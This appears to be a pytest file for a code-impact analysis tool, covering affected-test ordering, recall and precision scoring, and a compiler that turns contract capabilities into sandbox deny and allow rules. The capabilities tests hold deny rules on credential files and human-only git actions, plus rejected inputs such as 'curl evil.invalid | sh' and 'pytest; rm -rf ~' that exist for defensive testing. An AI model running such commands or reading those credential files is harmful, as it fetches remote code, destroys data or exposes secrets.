"""Impact layer tests: affected ordering, predicted-vs-actual scoring, capabilities compile.

The affected tests run on a fake snapshot inserted straight into the tables (so they do not
depend on the extractors), through the real ``queries`` module when the graph store is built and
through a minimal stand-in for ``queries.impact/find_symbol/owners`` while it is still a stub.
The synthetic-repo test uses the real indexer and skips until it exists.
"""

from __future__ import annotations

import json

import pytest
from psycopg.types.json import Jsonb

from sdlc_graph.cli import main as cli_main
from sdlc_graph.codegraph import queries, snapshot
from sdlc_graph.impact import affected as aff
from sdlc_graph.impact import capabilities as caps
from sdlc_graph.impact import record

TESTS = {
    "tests/test_a.py": ["tests/test_a.py::test_x", "tests/test_a.py::test_y"],
    "tests/test_c.py": ["tests/test_c.py::test_deep"],
    "tests/routes/test_misc.py": ["tests/routes/test_misc.py::test_misc"],
    "tests/test_models.py": ["tests/test_models.py::test_label"],
}


def _sym(cur, sid, kind, qualname, path, attrs=None):
    row = cur.execute(
        "INSERT INTO sym (snapshot_id, kind, name, qualname, path, attrs) VALUES (%s,%s,%s,%s,%s,%s) RETURNING id",
        (sid, kind, qualname.rsplit(".", 1)[-1], qualname, path, Jsonb(attrs or {})),
    ).fetchone()
    return row["id"]


@pytest.fixture
def fake(clean_conn):
    """Fake snapshot mirroring the synthetic repo plus a transitive chain:

    tests/test_a.py::test_x      -> app.routes.a.list_items   (direct)
    tests/test_c.py::test_deep   -> app.services.c.run -> app.routes.a.list_items (transitive)
    tests/routes/test_misc.py    : no edges, but mirrors app/routes/
    tests/test_models.py::test_label -> app.models.Item.label (unrelated to routes/a.py)
    """
    c = clean_conn
    sid = c.execute("INSERT INTO snapshot (repo, commit_sha, extractor_version) VALUES ('fake', %s, 't') RETURNING id",
                    ("a" * 40,)).fetchone()["id"]
    ids = {}
    for qn, path in [("app.routes.a", "app/routes/a.py"), ("app.services.c", "app/services/c.py"),
                     ("app.models", "app/models.py")]:
        ids[qn] = _sym(c, sid, "module", qn, path)
    ids["list_items"] = _sym(c, sid, "function", "app.routes.a.list_items", "app/routes/a.py")
    ids["run"] = _sym(c, sid, "function", "app.services.c.run", "app/services/c.py")
    ids["label"] = _sym(c, sid, "method", "app.models.Item.label", "app/models.py")
    ids["route"] = _sym(c, sid, "route", "GET /items", "app/routes/a.py", {"method": "GET", "path": "/items"})
    for tpath, nodeids in TESTS.items():
        mod = tpath[:-3].replace("/", ".")
        ids[tpath] = _sym(c, sid, "module", mod, tpath)
        for nid in nodeids:
            ids[nid] = _sym(c, sid, "test", f"{mod}.{nid.split('::')[1]}", tpath, {"nodeid": nid})
            c.execute("INSERT INTO sym_edge (snapshot_id, src, dst, rel) VALUES (%s,%s,%s,'defines')", (sid, ids[tpath], ids[nid]))

    def edge(src, dst, rel):
        c.execute("INSERT INTO sym_edge (snapshot_id, src, dst, rel) VALUES (%s,%s,%s,%s)", (sid, src, dst, rel))

    edge(ids["list_items"], ids["route"], "exposes_route")
    edge(ids["tests/test_a.py::test_x"], ids["list_items"], "tests")
    edge(ids["run"], ids["list_items"], "calls")
    edge(ids["tests/test_c.py::test_deep"], ids["run"], "tests")
    edge(ids["tests/test_models.py::test_label"], ids["label"], "tests")
    c.execute("INSERT INTO owner (snapshot_id, repo, path_glob, handle, ord) VALUES (%s,'fake','app/routes/','@alice',1),(%s,'fake','*','@team',0)", (sid, sid))
    return c, sid


@pytest.fixture
def graph(fake, monkeypatch):
    """Use the real queries when built; otherwise a minimal stand-in so the impact layer is testable alone."""
    c, sid = fake
    try:
        queries.impact(c, sid, paths=["app/routes/a.py"])
        return c, sid
    except NotImplementedError:
        pass

    def find_symbol(conn, snapshot_id, symbol):
        row = conn.execute("SELECT * FROM sym WHERE snapshot_id=%s AND (qualname=%s OR path=%s AND kind='module')",
                           (snapshot_id, symbol, symbol)).fetchone()
        if row is None:
            raise LookupError(symbol)
        return row

    def impact(conn, snapshot_id, *, paths=None, symbols=None, depth=4):
        roots = {}
        for p in paths or []:
            for r in conn.execute("SELECT * FROM sym WHERE snapshot_id=%s AND path=%s", (snapshot_id, p)).fetchall():
                roots[r["id"]] = 0
        for s in symbols or []:
            roots[find_symbol(conn, snapshot_id, s)["id"]] = 0
        seen = dict(roots)
        frontier = list(roots)
        for d in range(1, depth + 1):
            nxt = []
            for r in conn.execute(
                "SELECT DISTINCT src FROM sym_edge WHERE snapshot_id=%s AND dst = ANY(%s) AND rel IN ('imports','calls','tests')",
                (snapshot_id, frontier)).fetchall():
                if r["src"] not in seen:
                    seen[r["src"]] = d
                    nxt.append(r["src"])
            frontier = nxt
        rows = conn.execute("SELECT * FROM sym WHERE id = ANY(%s)", (list(seen),)).fetchall()
        syms = [{**r, "depth": seen[r["id"]]} for r in rows]
        routes = [r["qualname"] for r in conn.execute(
            "SELECT r.qualname FROM sym_edge e JOIN sym r ON r.id=e.dst WHERE e.snapshot_id=%s AND e.rel='exposes_route' AND e.src=ANY(%s)",
            (snapshot_id, list(seen))).fetchall()]
        tests = [s["attrs"]["nodeid"] for s in syms if s["kind"] == "test"]
        return {"snapshot_id": snapshot_id, "symbols": syms, "routes": routes, "tests": tests, "owners": {}}

    def owners(conn, repo, paths, **kw):
        return {p: ["@alice"] if p.startswith("app/routes/") else ["@team"] for p in paths}

    monkeypatch.setattr(queries, "impact", impact)
    monkeypatch.setattr(queries, "find_symbol", find_symbol)
    monkeypatch.setattr(queries, "owners", owners)
    return c, sid


# --------------------------------------------------------------------------- mirror rule (pure)


def test_mirror_tests_rule():
    files = sorted(TESTS) + ["tests/b/test_other.py", "tests/a/b/test_z.py"]
    assert aff.mirror_tests("app/routes/a.py", files) == ["tests/routes/test_misc.py", "tests/test_a.py"]
    assert aff.mirror_tests("a/b/c.py", files) == ["tests/a/b/test_z.py", "tests/b/test_other.py", "tests/test_c.py"]
    assert aff.mirror_tests("tests/test_a.py", files) == []
    assert aff.mirror_tests("README.md", files) == []
    assert aff.mirror_tests("app/routes/__init__.py", files) == ["tests/routes/test_misc.py"]


# --------------------------------------------------------------------------- affected


def test_affected_puts_direct_test_first(graph):
    c, sid = graph
    result = aff.affected(c, sid, paths=["app/routes/a.py"])
    assert result["tests"][0].startswith("tests/test_a.py::")
    assert result["tests"][0] == "tests/test_a.py::test_x"
    assert result["order"] == result["tests"]
    assert result["routes"] == ["GET /items"]


def test_affected_order_direct_then_transitive_then_mirror(graph):
    c, sid = graph
    result = aff.affected(c, sid, paths=["app/routes/a.py"])
    tests = result["tests"]
    assert tests == [
        "tests/test_a.py::test_x",               # direct (depth 1)
        "tests/test_c.py::test_deep",            # transitive (depth 2)
        "tests/routes/test_misc.py::test_misc",  # mirror only (tests/routes/)
        "tests/test_a.py::test_y",               # mirror only (tests/test_a.py)
    ]
    assert "tests/test_models.py::test_label" not in tests
    assert result["reasons"]["tests/test_a.py::test_y"] == "mirror path of app/routes/a.py"
    assert result["reasons"]["tests/test_a.py::test_x"].startswith("direct")
    assert result["reasons"]["tests/test_c.py::test_deep"].startswith("transitive")
    assert result["reasons"]["GET /items"] == "exposed by app.routes.a.list_items"


def test_affected_by_symbol_and_owners(graph):
    c, sid = graph
    result = aff.affected(c, sid, symbols=["app.routes.a.list_items"])
    assert result["tests"][0] == "tests/test_a.py::test_x"
    assert result["owners"]["tests/test_a.py"]  # owners of the tests are reported too


def test_affected_requires_input_and_known_snapshot(graph):
    c, sid = graph
    with pytest.raises(ValueError):
        aff.affected(c, sid)
    with pytest.raises(LookupError):
        aff.affected(c, sid + 999, paths=["app/routes/a.py"])


def test_affected_for_node_uses_touched_and_capability_paths(graph):
    c, sid = graph
    c.execute(
        "INSERT INTO node (kind, slug, title, repo, created_by, state, touched_symbols, capabilities) "
        "VALUES ('contract','contract-x','x','fake','@t','drafted',%s,%s)",
        (["function:app.routes.a.list_items@app/routes/a.py"], Jsonb({"paths": ["app/routes/**"]})),
    )
    result = aff.affected_for_node(c, "contract-x")
    assert result["tests"][0] == "tests/test_a.py::test_x"
    with pytest.raises(LookupError):
        aff.affected_for_node(c, "nope")


def test_affected_for_node_capability_paths_only_when_nothing_touched(graph):
    """Integration: capabilities.paths says where a contract may write (tests/**, app/**), not what it
    changes; unioning it with touched_symbols predicted the whole suite of a brownfield repository. It is a fallback."""
    c, sid = graph
    c.execute(
        "INSERT INTO node (kind, slug, title, repo, created_by, state, touched_symbols, capabilities) "
        "VALUES ('contract','contract-t','t','fake','@t','drafted',%s,%s), "
        "('contract','contract-p','p','fake','@t','drafted','{}',%s)",
        (["function:app.routes.a.list_items@app/routes/a.py"], Jsonb({"paths": ["app/**", "tests/**"]}),
         Jsonb({"paths": ["app/**", "tests/**"]})),
    )
    touched = aff.affected_for_node(c, "contract-t")
    roots = {s["path"] for s in touched["symbols"] if s.get("depth") == 0}
    assert roots == {"app/routes/a.py"}
    fallback = aff.affected_for_node(c, "contract-p")
    assert {s["path"] for s in fallback["symbols"] if s.get("depth") == 0} > roots


# --------------------------------------------------------------------------- scoring


def test_score_pure():
    assert record.score(["a.py::t1", "a.py::t2"], ["a.py::t1"]) == (0.5, 1.0)
    assert record.score(["a.py"], ["a.py::t1", "a.py::t2"]) == (1.0, 1.0)  # bare path covers the file
    assert record.score([], ["a.py::t1"]) == (None, 0.0)
    assert record.score(["a.py::t1"], []) == (0.0, None)
    assert record.score(["a.py::t1"], ["b.py::t9"]) == (0.0, 0.0)


def test_predict_and_outcome_recall_one(graph):
    c, sid = graph
    result = aff.affected(c, sid, paths=["app/routes/a.py"])
    pred = record.predict(c, sid, result)
    assert pred["predicted_tests"][0] == "tests/test_a.py::test_x"
    assert pred["predicted_routes"] == ["GET /items"]
    out = record.outcome(c, pred["prediction_id"], ["tests/test_a.py::test_x"])
    assert out["recall"] == 1.0
    assert out["precision"] == pytest.approx(0.25)
    assert out["missed"] == [] and out["matched"] == ["tests/test_a.py::test_x"]
    # recording again replaces the outcome
    again = record.record_outcome(c, pred["prediction_id"], ["tests/test_zzz.py::test_new"])
    assert again["recall"] == 0.0 and again["missed"] == ["tests/test_zzz.py::test_new"]
    assert c.execute("SELECT count(*) AS n FROM prediction_outcome").fetchone()["n"] == 1


def test_predict_from_node_slug_and_paths(graph):
    c, sid = graph
    c.execute("INSERT INTO node (kind, slug, title, repo, created_by, state, touched_symbols) "
              "VALUES ('contract','contract-p','p','fake','@t','drafted',%s)", (["app/routes/a.py"],))
    pred = record.predict(c, sid, slug="contract-p")
    assert pred["node"] == "contract-p" and pred["predicted_tests"][0] == "tests/test_a.py::test_x"
    stored = c.execute("SELECT node_id, inputs FROM prediction WHERE id = %s", (pred["prediction_id"],)).fetchone()
    assert stored["node_id"] is not None
    p2 = record.predict(c, sid, paths=["app/models.py"])
    assert p2["predicted_tests"][0] == "tests/test_models.py::test_label"
    with pytest.raises(LookupError):
        record.predict(c, sid, slug="nope", paths=["app/models.py"])
    with pytest.raises(LookupError):
        record.record_outcome(c, 999999, [])
    with pytest.raises(ValueError):
        record.predict(c, sid)


def test_outcome_from_junit_xml(graph, tmp_path):
    c, sid = graph
    pred = record.predict(c, sid, aff.affected(c, sid, paths=["app/routes/a.py"]))
    xml = tmp_path / "junit.xml"
    xml.write_text(
        '<testsuites><testsuite name="pytest" tests="3">'
        '<testcase classname="tests.test_a" name="test_x"><failure message="boom"/></testcase>'
        '<testcase classname="tests.test_a" name="test_y"/>'
        '<testcase classname="tests.test_models" name="test_label"><error message="err"/></testcase>'
        "</testsuite></testsuites>"
    )
    out = record.outcome(c, pred["prediction_id"], str(xml))
    assert out["actual_failing_tests"] == ["tests/test_a.py::test_x", "tests/test_models.py::test_label"]
    assert out["recall"] == 0.5 and out["missed"] == ["tests/test_models.py::test_label"]
    with pytest.raises(ValueError):
        bad = tmp_path / "bad.xml"
        bad.write_text("not xml")
        record.outcome(c, pred["prediction_id"], bad)


def test_failing_from_junit_strips_a_foreign_rootdir_prefix(tmp_path):
    """Integration: a checkout nested under another project's pytest config (the demo's
    .demo/sample-app) gets classnames like '.demo.sample-app.tests.test_items'; recall was 0.0."""
    xml = tmp_path / "junit.xml"
    xml.write_text(
        '<testsuites><testsuite name="pytest">'
        '<testcase classname=".demo.sample-app.tests.test_items" name="test_create_requires_key">'
        '<failure message="assert 403 == 401"/></testcase>'
        '<testcase classname="x.y.tests.test_f" name="test_n" file="x/y/tests/test_f.py"><error/></testcase>'
        '<testcase classname=".demo.sample-app.tests.test_items" name="test_create_with_key"/>'
        '</testsuite></testsuites>')
    known = {"tests/test_items.py", "tests/test_f.py"}
    assert record.failing_from_junit(xml, known) == ["tests/test_f.py::test_n",
                                                     "tests/test_items.py::test_create_requires_key"]


def test_failing_from_junit_class_and_file_attr(tmp_path):
    xml = tmp_path / "j.xml"
    xml.write_text(
        '<testsuite>'
        '<testcase classname="tests.sub.test_k.TestK" name="test_m"><failure/></testcase>'
        '<testcase classname="tests.test_f" file="tests/test_f.py" name="test_n"><failure/></testcase>'
        "</testsuite>"
    )
    assert record.failing_from_junit(xml) == ["tests/sub/test_k.py::TestK::test_m", "tests/test_f.py::test_n"]


def test_summary_means_and_counts(graph):
    c, sid = graph
    a = record.predict(c, sid, {"tests": ["t.py::a", "t.py::b"], "routes": []})
    b = record.predict(c, sid, {"tests": ["t.py::a"], "routes": []})
    record.predict(c, sid, {"tests": ["t.py::z"], "routes": []})  # no outcome yet
    record.outcome(c, a["prediction_id"], ["t.py::a"])  # precision .5 recall 1
    record.outcome(c, b["prediction_id"], ["t.py::q"])  # precision 0 recall 0
    s = record.summary(c, "fake")
    assert (s["predictions"], s["outcomes"]) == (3, 2)
    assert s["mean_precision"] == pytest.approx(0.25) and s["mean_recall"] == pytest.approx(0.5)
    assert record.summary(c, "other-repo") == {"repo": "other-repo", "predictions": 0, "outcomes": 0,
                                               "scored_precision": 0, "scored_recall": 0,
                                               "mean_precision": None, "mean_recall": None}


# --------------------------------------------------------------------------- capabilities

VERIFIED_TOP = {"sandbox", "permissions"}
VERIFIED_SANDBOX = {"enabled", "filesystem", "network"}
VERIFIED_PERMISSION = {"allow", "deny"}


def test_capabilities_only_verified_keys_and_deny_rules():
    out = caps.compile_capabilities({"paths": ["app/routes/**", "tests/test_routes.py"], "egress": ["pypi.org"],
                                     "data": ["postgres:ro"], "secrets": []})
    assert set(out) == VERIFIED_TOP
    assert set(out["sandbox"]) <= VERIFIED_SANDBOX and out["sandbox"]["enabled"] is True
    assert set(out["sandbox"]["filesystem"]) == {"allowWrite"} and set(out["sandbox"]["network"]) == {"allowedDomains"}
    assert set(out["permissions"]) == VERIFIED_PERMISSION
    assert out["sandbox"]["filesystem"]["allowWrite"] == ["./app/routes", "./tests/test_routes.py"]
    assert out["sandbox"]["network"]["allowedDomains"] == ["pypi.org"]
    deny = out["permissions"]["deny"]
    for rule in ("Read(~/.ssh/**)", "Read(~/.aws/**)", "Read(~/.config/gh/**)", "Read(./.env)", "Read(./.env.test)",
                 "Read(./.env.*.local)", "Read(./*.env)"):
        assert rule in deny
    assert "Read(./.env.*)" not in deny and not any("example" in r or "sample" in r for r in deny)
    assert all(r.startswith(("Read(", "Bash(")) for r in deny)
    assert {"Bash(gh pr merge *)", "Bash(git push *--force*)", "Bash(git commit *--no-verify*)"} <= set(deny)  # human-only actions
    assert "Edit(./app/routes/**)" in out["permissions"]["allow"]
    assert "Bash(python -m pytest *)" in out["permissions"]["allow"]
    json.dumps(out)  # JSON serialisable
    assert "postgres" not in json.dumps(out)  # data is not expressible, so it is not emitted


def test_capabilities_deterministic_and_secrets_lift_exact_rules():
    a = caps.compile_capabilities({"paths": ["b/", "a/x.py"], "egress": ["z.io", "a.io"]})
    b = caps.compile_capabilities({"paths": ["a/x.py", "b/"], "egress": ["a.io", "z.io"]})
    assert a == b and a["sandbox"]["network"]["allowedDomains"] == ["a.io", "z.io"]
    lifted = caps.compile_full({"paths": [], "secrets": [".env", ".env.local"]})
    assert "Read(./.env)" not in lifted["settings"]["permissions"]["deny"]
    assert "Read(./.env.local)" not in lifted["settings"]["permissions"]["deny"]
    assert "Read(./.env.*.local)" in lifted["settings"]["permissions"]["deny"]  # a wildcard deny cannot carve an exception
    assert any(".env.local" in n for n in lifted["notes"])
    both = caps.compile_capabilities({"secrets": [".env.*.local"]})
    assert "Read(./.env.*.local)" not in both["permissions"]["deny"] and "Read(~/.ssh/**)" in both["permissions"]["deny"]


def test_capabilities_glob_widening_is_reported_and_test_command():
    full = caps.compile_full({"paths": ["app/**/x.py"], "test_command": "uv run pytest"})
    assert full["settings"]["sandbox"]["filesystem"]["allowWrite"] == ["./app"]
    assert any("wider than the glob" in n for n in full["notes"])
    assert "Bash(uv run pytest *)" in full["settings"]["permissions"]["allow"]
    assert "Edit(./app/**/x.py)" in full["settings"]["permissions"]["allow"]
    assert "NOT enforced" not in caps.compile_full({})["summary"]
    assert "postgres:ro" in caps.compile_full({"data": ["postgres:ro"]})["summary"]


@pytest.mark.parametrize("bad", [
    {"paths": ["../etc"]}, {"paths": ["/abs"]}, {"paths": ["~/x"]}, {"egress": ["http://x.io"]},
    {"egress": ["bad host"]}, {"nope": []}, {"paths": "a"}, {"secrets": [1]}, {"test_command": ""},
])
def test_capabilities_validate_rejects(bad):
    with pytest.raises(ValueError):
        caps.validate(bad)


def test_capabilities_compile_for_node(clean_conn):
    clean_conn.execute(
        "INSERT INTO node (kind, slug, title, repo, created_by, state, capabilities) VALUES "
        "('contract','contract-cap','t','r','@t','drafted',%s)", (Jsonb({"paths": ["app/"], "egress": ["pypi.org"]}),))
    out = caps.compile_for(clean_conn, "contract-cap")
    assert out["slug"] == "contract-cap" and out["settings"]["sandbox"]["filesystem"]["allowWrite"] == ["./app"]
    assert "summary" in out
    with pytest.raises(LookupError):
        caps.compile_for(clean_conn, "missing")


# --------------------------------------------------------------------------- CLI


def test_cli_capabilities_compile_write(tmp_path, capsys):
    target = tmp_path / "out" / "settings.fragment.json"
    rc = cli_main(["capabilities", "compile", "--file", '{"paths":["app/**"],"egress":["pypi.org"]}',
                   "--write", str(target), "--json"])
    assert rc == 0
    written = json.loads(target.read_text())
    assert set(written) == VERIFIED_TOP and written["sandbox"]["filesystem"]["allowWrite"] == ["./app"]
    assert json.loads(capsys.readouterr().out)["written"] == str(target)
    assert cli_main(["capabilities", "compile", "--json"]) == 2  # no slug and no --file


def test_cli_impact_predict_outcome_summary(graph, capsys):
    c, sid = graph
    import os
    assert os.environ["SDLC_SCHEMA"]  # CLI connects to the test schema
    rc = cli_main(["impact", "predict", "--repo", "fake", "--paths", "app/routes/a.py", "--json"])
    assert rc == 0
    pred = json.loads(capsys.readouterr().out)
    assert pred["predicted_tests"][0] == "tests/test_a.py::test_x"
    rc = cli_main(["impact", "outcome", "--prediction", str(pred["prediction_id"]), "--failing",
                   "tests/test_a.py::test_x", "--json"])
    assert rc == 0 and json.loads(capsys.readouterr().out)["recall"] == 1.0
    assert cli_main(["impact", "summary", "--repo", "fake", "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["outcomes"] == 1
    assert cli_main(["impact", "affected", "--repo", "fake", "--paths", "app/routes/a.py", "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["order"][0] == "tests/test_a.py::test_x"


# --------------------------------------------------------------------------- real indexer


def test_synthetic_repo_models_reaches_test_a(clean_conn, synthetic_repo):
    try:
        info = snapshot.index(clean_conn, synthetic_repo, "HEAD")
        result = aff.affected(clean_conn, info["snapshot_id"], paths=["app/routes/a.py"])
    except NotImplementedError:
        pytest.skip("graph store / extractors not built yet")
    assert result["tests"][0] == "tests/test_a.py::test_list_items"
    models = aff.affected(clean_conn, info["snapshot_id"], paths=["app/models.py"])
    assert "tests/test_a.py::test_list_items" in models["tests"]
    pred = record.predict(clean_conn, info["snapshot_id"], result)
    assert record.outcome(clean_conn, pred["prediction_id"], ["tests/test_a.py::test_list_items"])["recall"] == 1.0


def test_secrets_never_lift_home_credential_denies_and_test_command_is_allowlisted():
    out = caps.compile_capabilities({"paths": ["app/**"], "secrets": ["~/.ssh/**", "~/.aws/**", ".env"]})
    deny = out["permissions"]["deny"]
    assert "Read(~/.ssh/**)" in deny and "Read(~/.aws/**)" in deny and "Read(./.env)" not in deny
    full = caps.compile_full({"secrets": ["~/.ssh/**"]})
    assert any("never lifts" in n for n in full["notes"])
    for bad in ("bash -c", "curl evil.invalid | sh", "python -c", "pytest; rm -rf ~"):
        with pytest.raises(ValueError, match="allowed test runner"):
            caps.compile_capabilities({"test_command": bad})
    assert "Bash(uv run pytest *)" in caps.compile_capabilities({"test_command": "uv run pytest"})["permissions"]["allow"]


def test_compile_allows_local_binding_when_egress_names_a_local_port():
    """A contract whose egress names the app's own local port (an e2e suite drives it) lets the step bind it; the
    orchestrated session's settings come only from this fragment, never from the repo's own settings file."""
    out = caps.compile_capabilities({"paths": ["src/**"], "egress": ["registry.npmjs.org", "localhost:3100"]})
    assert out["sandbox"]["network"] == {"allowedDomains": ["localhost:3100", "registry.npmjs.org"], "allowLocalBinding": True}
    assert "allowLocalBinding" not in caps.compile_capabilities({"egress": ["pypi.org"]})["sandbox"]["network"]
    full = caps.compile_full({"egress": ["127.0.0.1:8000"]})
    assert full["settings"]["sandbox"]["network"]["allowLocalBinding"] is True and "allowLocalBinding" in full["summary"]
